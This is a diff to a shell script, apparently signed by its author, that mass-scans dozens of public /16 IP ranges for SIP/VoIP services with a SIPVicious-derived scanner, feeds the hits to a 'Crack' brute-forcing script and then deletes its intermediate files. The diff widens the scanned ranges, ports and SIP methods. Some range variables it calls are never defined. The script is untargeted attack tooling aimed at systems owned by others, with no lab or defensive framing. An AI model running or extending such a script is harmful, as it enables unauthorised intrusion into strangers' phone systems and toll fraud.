@@ -6,34 +6,250 @@
 
 echo -e "\nStart scanning ...\n"
 
-VAR1=188.165.50.0/20
-VAR2=212.83.170.0/20
-VAR3=5.135.186.0/20
-VAR4=54.36.20.0/20
-VAR5=217.182.71.0/20
+VAR1=204.0.0.0/16
+VAR2=204.1.0.0/16
+VAR3=204.2.0.0/16
+VAR4=204.3.0.0/16
+VAR5=204.4.0.0/16
+VAR6=204.5.0.0/16
+VAR7=204.6.0.0/16
+VAR8=204.7.0.0/16
+VAR9=204.8.0.0/16
+VAR10=204.9.0.0/16
+VAR11=204.10.0.0/16
+VAR12=204.11.0.0/16
+VAR13=204.12.0.0/16
+VAR14=204.13.0.0/16
+VAR15=204.14.0.0/16
+VAR16=204.15.0.0/16
+VAR17=204.16.0.0/16
+VAR18=204.17.0.0/16
+VAR19=204.18.0.0/16
+VAR20=204.19.0.0/16
+VAR21=204.20.0.0/16
+VAR22=204.21.0.0/16
+VAR23=204.22.0.0/16
+VAR24=204.23.0.0/16
+VAR25=204.24.0.0/16
+VAR26=204.25.0.0/16
+VAR27=204.26.0.0/16
+VAR28=204.27.0.0/16
+VAR29=204.28.0.0/16
+VAR30=204.29.0.0/16
+VAR31=204.30.0.0/16
+VAR32=204.31.0.0/16
+VAR33=204.32.0.0/16
+VAR44=204.33.0.0/16
+VAR45=204.34.0.0/16
+VAR46=204.35.0.0/16
+VAR47=204.36.0.0/16
+VAR48=204.37.0.0/16
+VAR49=204.38.0.0/16
+VAR50=204.39.0.0/16
 
      echo ----------------$VAR1----------------
-docker run -i russmckendrick/sipvicious svmap.py -p5060-5099 $VAR1 -t0.0 -v >> result.txt
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR1 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
 
      echo ----------------$VAR2----------------
-docker run -i russmckendrick/sipvicious svmap.py -p5060-5099 $VAR2 -t0.0 -v >> result.txt
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR2 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
 
      echo ----------------$VAR3----------------
-docker run -i russmckendrick/sipvicious svmap.py -p5060-5099 $VAR3 -t0.0 -v >> result.txt
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR3 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
 
      echo ----------------$VAR4----------------
-docker run -i russmckendrick/sipvicious svmap.py -p5060-5099 $VAR4 -t0.0 -v >> result.txt
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR4 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
 
      echo ----------------$VAR5----------------
-docker run -i russmckendrick/sipvicious svmap.py -p5060-5099 $VAR5 -t0.0 -v >> result.txt
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR5 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR6----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR6 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR7----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR7 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR8----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR8 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR9----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR9 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR10----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR10 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR11----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR11 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR12----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR12 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR13----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR13 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR14----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR14 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR15----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR15 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR16----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR16 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR17----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR17 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR18----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR18 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR19----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR19 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR20----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR20 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR21----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR21 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR22----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR22 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR23----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR23 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR24----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR24 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR25----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR25 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR26----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR26 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR27----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR27 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR28----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR28 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR29----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR29 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR30----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR30 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR31----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR31 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR32----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR32 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR33----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR33 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR34----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR34 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR35----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR35 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR36----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR36 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR37----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR37 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR38----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR38 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR39----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR39 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR40----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR40 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR41----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR41 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR42----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR42 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR43----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR43 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR44----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR44 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR45----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR45 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR46----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR46 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR47----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR47 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR48----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR48 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR49----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR49 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
+
+     echo ----------------$VAR50----------------
+python svmap.bu.py  -p5060-5099,14310,6060-6065,9090,1025,1153,10243 $VAR50 -m INVITE -m OPTIONS -m REGISTER -t0.0 -v >> result.txt
 
 
+
 echo "we scaned Everythings"
 echo "we scaned Everythings"
 echo "we scaned Everythings"
 echo "we scaned Everythings"
 echo "we scaned Everythings"
-sleep 20
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+sleep 50
 
 echo -e "\nEnding scanning port !\n"
 
@@ -58,10 +274,11 @@ perl Crack 250 2 ipSIP
 rm ipSIP # remove the file ipSIP
 rm *.pal # remove the file
 
-sleep 5
+sleep 50
 
 echo -e "\nEnding crack !\n"
 echo -e "\nby Mohammad Elnwajha\n"
+
 
 
 
